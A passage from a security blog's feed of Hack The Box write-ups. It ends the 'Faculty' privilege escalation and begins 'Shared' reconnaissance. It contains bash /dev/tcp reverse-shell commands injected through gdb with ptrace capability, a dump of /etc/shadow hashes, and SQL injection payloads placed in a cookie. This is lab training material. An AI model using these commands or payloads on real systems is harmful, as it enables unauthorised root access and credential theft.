font-style: inherit;">void</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">system</span><span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"sleep 5"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb19-4"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">gdb</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">call</span> <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">void</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">system</span><span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.115.135/5656 0&gt;&amp;1'"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span></code></pre></div>
<blockquote class="blockquote">
<p><em>“<strong>Linux Capabilities</strong> are used to allow binaries (executed by non-root users) to perform privileged operations without providing them all root permissions. This model allows the binary or program to grant specific permissions to perform privileged operations rather than giving them root privileges by granting setuid, setguid or sudo without a password.”</em></p>
</blockquote>
<div class="sourceCode" id="cb20" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb20-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">developer@faculty:~$</span> getcap <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$(</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">which</span> gdb<span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">)</span></span>
<span id="cb20-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">/usr/bin/gdb</span> = cap_sys_ptrace+ep</span></code></pre></div>
<p>With found cabability, <code>ptrace</code>, the current user can attach to other processes and trace their system calls. Testing to attach to a bunch of different services I get this error when trying to call <code>system</code> function:</p>
<div class="sourceCode" id="cb21" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb21-1"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">gdb</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">call</span> <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">void</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">system</span><span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"id"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb21-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">No</span> symbol <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"system"</span> in current context.</span></code></pre></div>
<p>However, I find one process that do work and we’re able to get a reverse shell as <code>root</code>!</p>
<div class="sourceCode" id="cb22" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb22-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">developer@faculty:/dev/shm$</span> ps aux <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">grep</span> root</span>
<span id="cb22-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[...</span> snip ...]</span>
<span id="cb22-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">root</span>         733  0.0  0.9  26896 18172 <span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">?</span>        Ss   08:00   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--run-startup-triggers</span></span>
<span id="cb22-4"></span>
<span id="cb22-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">developer@faculty:/dev/shm$</span> gdb <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-p</span> 733</span>
<span id="cb22-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[...</span> snip ...]</span>
<span id="cb22-7"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">gdb</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">call</span> <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">void</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">system</span><span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.4/4488 0&gt;&amp;1'"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb22-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[Detaching</span> after vfork from child process 49752]</span>
<span id="cb22-9"></span>
<span id="cb22-10"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  faculty nc <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-lvnp</span> 4488</span>
<span id="cb22-11"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">listening</span> on <span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">[</span><span class="ss" style="color: #20794D;
background-color: null;
font-style: inherit;">any</span><span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">]</span> 4488 ...</span>
<span id="cb22-12"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">connect</span> to <span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">[</span><span class="ss" style="color: #20794D;
background-color: null;
font-style: inherit;">10.10.14.4</span><span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">]</span> from <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">UNKNOWN</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[10.10.11.169]</span> 57988</span>
<span id="cb22-13"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">bash:</span> cannot set terminal process group <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">733</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">:</span> Inappropriate ioctl for device</span>
<span id="cb22-14"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">bash:</span> no job control in this shell</span>
<span id="cb22-15"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">root@faculty:/#</span> id <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">&amp;&amp;</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">cat</span> /root/root.txt</span>
<span id="cb22-16"><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">uid</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>0<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">root</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">gid</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>0<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">root</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">groups</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>0<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">root</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb22-17"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">b8a6c75d466c5979b9886556151f2866</span></span>
<span id="cb22-18"></span>
<span id="cb22-19"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">cat</span> /etc/shadow</span>
<span id="cb22-20"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">root:</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$6$CiEa</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">.wxtUKxG5q21</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$ED3MTE6ehz0j0q4kRQfK4bnLQFLZDrG9skIPsc0p2</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">/X3JSBHFWjRWAZwEdUpqON6UqZOXvme7.1wHzNCVHqk9/:18559:0:99999:7:::</span></span>
<span id="cb22-21"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">gbyolo:</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$6$ccGHy1FmLiRRtdRO$8</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">YUhXxCWlUNP7/VSch6vqb3aEMs4j/ncGyPCObyl9rS8C/ZDiC4.NOXAb0B1cuMir0ilQK.IDWFjDEryXV5fx1:19165:0:99999:7:::</span></span>
<span id="cb22-22"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">developer:</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$6$oY</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">/UDfRNf0UfWpGG</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$PUFSZoqX4AM1igh7RFTCLRnbs4Qi19jdqOMeZWBIwnkVS</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">//6iyRbNaY/ZFcNoCFDMfdgAlnA4C7EiPRV9Ayvc.:18559:0:99999:7:::</span></span></code></pre></div>


</section>
</section>

 ]]></description>
  <category>hackthebox</category>
  <category>linux</category>
  <category>sqli</category>
  <category>mpdf</category>
  <category>lfi</category>
  <category>meta-git</category>
  <category>gdb</category>
  <category>ptrace</category>
  <guid>https://exploit.se/posts/2022-08-26-htb-writeup-faculty/2022-08-26-htb-writeup-faculty.html</guid>
  <pubDate>Fri, 26 Aug 2022 00:00:00 GMT</pubDate>
  <media:content url="https://exploit.se/posts/2022-08-26-htb-writeup-faculty/images/faculty_logo.png" medium="image" type="image/png" height="144" width="144"/>
</item>
<item>
  <title>Shared - Hack The Box</title>
  <dc:creator>0xPThree </dc:creator>
  <link>https://exploit.se/posts/2022-08-25-htb-writeup-shared/2022-08-25-htb-writeup-shared.html</link>
  <description><![CDATA[ 





<section id="user" class="level1">
<h1>USER</h1>
<section id="step-1" class="level3">
<h3 class="anchored" data-anchor-id="step-1">Step 1</h3>
<div class="sourceCode" id="cb1" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb1-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  /htb nmap <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-Pn</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-n</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-p-</span> 10.10.11.172</span>
<span id="cb1-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">PORT</span>    STATE SERVICE</span>
<span id="cb1-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">22/tcp</span>  open  ssh</span>
<span id="cb1-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">80/tcp</span>  open  http</span>
<span id="cb1-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">443/tcp</span> open  https</span>
<span id="cb1-6"></span>
<span id="cb1-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  /htb nmap <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-Pn</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-n</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-p22,80,443</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-sCV</span> 10.10.11.172</span>
<span id="cb1-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">PORT</span>    STATE SERVICE  VERSION</span>
<span id="cb1-9"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">22/tcp</span>  open  ssh      OpenSSH 8.4p1 Debian 5+deb11u1 <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">protocol</span> 2.0<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb1-10"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ssh-hostkey:</span> </span>
<span id="cb1-11"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>   <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">3072</span> 91:e8:35:f4:69:5f:c2:e2:0e:27:46:e2:a6:b6:d8:65 <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">RSA</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb1-12"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>   <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">256</span> cf:fc:c4:5d:84:fb:58:0b:be:2d:ad:35:40:9d:c3:51 <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ECDSA</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb1-13"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_</span>  256 a3:38:6d:75:09:64:ed:70:cf:17:49:9a:dc:12:6d:11 <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ED25519</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb1-14"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">80/tcp</span>  open  http     nginx 1.18.0</span>
<span id="cb1-15"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_http-title:</span> Did not follow redirect to http://shared.htb</span>
<span id="cb1-16"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_http-server-header:</span> nginx/1.18.0</span>
<span id="cb1-17"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">443/tcp</span> open  ssl/http nginx 1.18.0</span>
<span id="cb1-18"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_http-title:</span> Did not follow redirect to https://shared.htb</span>
<span id="cb1-19"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ssl-cert:</span> Subject: commonName=<span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">*</span>.shared.htb/organizationName=HTB/stateOrProvinceName=None/countryName=US</span>
<span id="cb1-20"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Not</span> valid before: 2022-03-20T13:37:14</span>
<span id="cb1-21"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_Not</span> valid after:  2042-03-15T13:37:14</span>
<span id="cb1-22"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">tls-nextprotoneg:</span> </span>
<span id="cb1-23"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>   <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">h2</span></span>
<span id="cb1-24"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_</span>  http/1.1</span>
<span id="cb1-25"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_ssl-date:</span> TLS randomness does not represent time</span>
<span id="cb1-26"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">tls-alpn:</span> </span>
<span id="cb1-27"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>   <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">h2</span></span>
<span id="cb1-28"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_</span>  http/1.1</span>
<span id="cb1-29"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_http-server-header:</span> nginx/1.18.0</span>
<span id="cb1-30"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Service</span> Info: OS: Linux<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">CPE:</span> cpe:/o:linux:linux_kernel</span></code></pre></div>
<p>Port 80 is redirecting to <code>http://shared.htb</code> and from there to <code>https://shared.htb</code></p>
<div class="sourceCode" id="cb2" style="background: #f1f3f5;"><pre class="sourceCode r code-with-copy"><code class="sourceCode r"><span id="cb2-1">➜  <span class="sc" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">/</span>htb curl <span class="sc" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>kvs <span class="sc" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>L http<span class="sc" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span><span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">//</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">10</span>.<span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">10</span>.<span class="fl" style="color: #AD0000;
background-color: null;
font-style: inherit;">11.172</span></span>
<span id="cb2-2"><span class="sc" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">*</span>   Trying <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">10</span>.<span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">10</span>.<span class="fl" style="color: #AD0000;
background-color: null;
font-style: inherit;">11.172</span><span class="sc" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">80</span>...</span>
<span id="cb2-3"><span class="sc" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">*</span> Connected to <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">10</span>.<span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">10</span>.<span class="fl" style="color: #AD0000;
background-color: null;
font-style: inherit;">11.172</span> (<span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">10</span>.<span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">10</span>.<span class="fl" style="color: #AD0000;
background-color: null;
font-style: inherit;">11.172</span>) port <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">80</span> (<span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">#0)</span></span>
<span id="cb2-4"><span class="sc" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> GET <span class="sc" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">/</span> HTTP<span class="sc" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">/</span><span class="fl" style="color: #AD0000;
background-color: null;
font-style: inherit;">1.1</span></span>
<span id="cb2-5"><span class="sc" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> Host<span class="sc" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span> <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">10</span>.<span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">10</span>.<span class="fl" style="color: #AD0000;
background-color: null;
font-style: inherit;">11.172</span></span>
<span id="cb2-6"><span class="sc" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span> HTTP<span class="sc" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">/</span><span class="fl" style="color: #AD0000;
background-color: null;
font-style: inherit;">1.1</span> <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">301</span> Moved Permanently</span>
<span id="cb2-7"><span class="sc" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span> Server<span class="sc" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span> nginx<span class="sc" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">/</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">1</span>.<span class="fl" style="color: #AD0000;
background-color: null;
font-style: inherit;">18.0</span></span>
<span id="cb2-8"><span class="sc" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span> Location<span class="sc" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span> http<span class="sc" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span><span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">//</span>shared.htb</span>
<span id="cb2-9"><span class="sc" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span> </span>
<span id="cb2-10"><span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">&gt;</span> GET <span class="sc" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">/</span> HTTP<span class="sc" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">/</span><span class="fl" style="color: #AD0000;
background-color: null;
font-style: inherit;">1.1</span></span>
<span id="cb2-11"><span class="sc" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> Host<span class="sc" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span> shared.htb</span>
<span id="cb2-12"><span class="sc" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span> HTTP<span class="sc" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">/</span><span class="fl" style="color: #AD0000;
background-color: null;
font-style: inherit;">1.1</span> <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">301</span> Moved Permanently</span>
<span id="cb2-13"><span class="sc" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span> Server<span class="sc" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span> nginx<span class="sc" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">/</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">1</span>.<span class="fl" style="color: #AD0000;
background-color: null;
font-style: inherit;">18.0</span></span>
<span id="cb2-14"><span class="sc" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span> Location<span class="sc" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span> https<span class="sc" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span><span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">//</span>shared.htb<span class="sc" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">/</span></span>
<span id="cb2-15"><span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">*</span> Clear auth, redirects to port from <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">80</span> to <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">443</span></span>
<span id="cb2-16"><span class="sc" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">*</span> Issue another request to this URL<span class="sc" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'https://shared.htb/'</span></span></code></pre></div>
<div class="sourceCode" id="cb3" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb3-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  webanalyze ./webanalyze <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-host</span> https://shared.htb</span>
<span id="cb3-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">https://shared.htb</span> <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">0.7s</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">:</span></span>
<span id="cb3-3">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Nginx,</span> 1.18.0 <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Web</span> servers, Reverse proxies<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb3-4">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">PHP,</span>  <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Programming</span> languages<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span></code></pre></div>
<p><img src="https://exploit.se/posts/2022-08-25-htb-writeup-shared/images/shared01.png" class="img-fluid"></p>
<p>New checkout process “be sure to take a look on it!” - is that a hint maybe? Pressing “checkout” takes you to https://checkout.shared.htb, add it to <code>/etc/hosts</code>. In the footer of the page we find that the site is built using <strong>PrestaShop</strong>. Googling about PrestaShop we find some older and newer vulns, but in particular <a href="https://build.prestashop.com/news/major-security-vulnerability-on-prestashop-websites/">one from 2022</a> where the module <code>blockwishlist</code> is vulnerable.</p>
<p>The vulnerability is executed with help of SQL Injection, so lets look for a vector.</p>
<p>All items we add from the store are processed and saved in the cookie variable <code>custom_cart</code>, which is URL encoded and sticks out. Decode the data and playing around I find that the value field is reflected in the response. <img src="https://exploit.se/posts/2022-08-25-htb-writeup-shared/images/shared02.png" class="img-fluid"></p>
<p>Playing around with SQLi in the product ID field I find that testing <code>'ORDER BY 4-- -</code> returns “Not Found”, while <code>'ORDER BY 3-- -</code> still returns the ID. <img src="https://exploit.se/posts/2022-08-25-htb-writeup-shared/images/shared03.png" class="img-fluid"></p>
<p><img src="https://exploit.se/posts/2022-08-25-htb-writeup-shared/images/shared04.png" class="img-fluid"></p>
<p>Further testing and I find:</p>
<div class="sourceCode" id="cb4" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb4-1"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">## Request</span></span>
<span id="cb4-2"><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">custom_cart</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">{</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"4HAR4XDK'OR 1=1 UNION SELECT @@version,2,3-- -"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"1"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"2E6E8GXJ"</span><span class="dt" style="color: #AD0000;
background-color: null;
